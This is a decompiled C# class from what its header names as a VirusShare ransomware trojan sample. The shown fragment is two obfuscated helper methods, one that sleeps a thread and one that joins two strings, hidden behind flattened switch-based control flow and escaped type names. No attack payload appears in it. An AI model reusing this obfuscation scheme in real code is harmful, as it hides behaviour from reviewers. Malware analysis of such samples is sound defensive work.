// Decompiled with JetBrains decompiler
// Type: D
// Assembly: DoWhat, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0ED18CB9-F18D-4F08-B56D-6FBDC0ACDCD8
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-3bc6ab721f878246ff7ef6df4c28f34c8cd1080bc47cfb3e673e529fcb7fa6dc.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using W;

internal sealed class D
{
  internal static void Y([In] int obj0, [In] short obj1, [In] short obj2)
  {
    char[] x = A.X;
    char[] o = W.Y.O;
    int num1 = 4;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          int num3;
          switch (((int) obj1 ^ (int) obj2) - 115 ^ num2)
          {
            case 0:
              num3 = (int) x[355] - 40335;
              break;
            default:
              num3 = 5;
              break;
          }
          num1 = num3;
          continue;
        case 1:
        case 2:
          ++num2;
          int num4 = 832 * 7;
          W.Y.O[228] = (char) (((int) W.Y.O[228] | obj0) & 43);
          num1 = 6279 > 897 - num4 ? (int) x[600] - 4939 : (int) o[280] - 40200;
          continue;
        case 3:
          num1 = (int) o[239] - (int) o[239];
          continue;
        case 5:
        case 7:
        case 9:
          num1 = 1;
          continue;
        case 6:
          goto label_11;
        case 8:
          Thread.Sleep(obj0);
          goto case 1;
        default:
          num2 = 0;
          num1 = 0;
          continue;
      }
    }
label_11:;
  }

  internal static string T<\u0021\u00210, \u0021\u00211>(
    [In] \u0021\u00211 obj0,
    [In] \u0021\u00210 obj1,
    [In] short obj2,
    [In] short obj3)
    where \u0021\u00210 : string
    where \u0021\u00211 : string
  {
    char[] x = A.X;
    char[] o = W.Y.O;
label_3:
    int num1 = 0;
    int num2 = 8;
    IEquatable<string> equatable;
    int num3;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = num3 % 2 != 0 ? (int) x[120] - 38692 : 5;
          continue;
        case 1:
          equatable = (IEquatable<string>) null;
          num2 = (int) x[523] - 53709;
          continue;
        case 2:
        case 7:
          goto label_3;
        case 4:
        case 9:
          equatable = (IEquatable<string>) ((string) obj0 + (string) obj1);
          num2 = 6;
          continue;
        case 5:
          goto label_12;
        case 6:
        case 11:
          ++num1;
          int num4 = (int) obj3;
          int num5 = num4 * num4;
          num3 = (int) obj3 + num5;
          num2 = (int) o[174] - 50062;
          continue;
        case 8:
          int num6;
          switch (((int) obj2 ^ (int) obj3) - 115 ^ num1)
          {
            case 0:
              num6 = (int) o[118] - 63653;
              break;
            default:
              num6 = 1;
              break;
          }
          num2 = num6;
          continue;
        case 10:
          num2 = 8;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (D.T);
          num2 = (int) x[581] - 13418;
          continue;
      }
    }
label_12:
    return (string) equatable;
  }
}
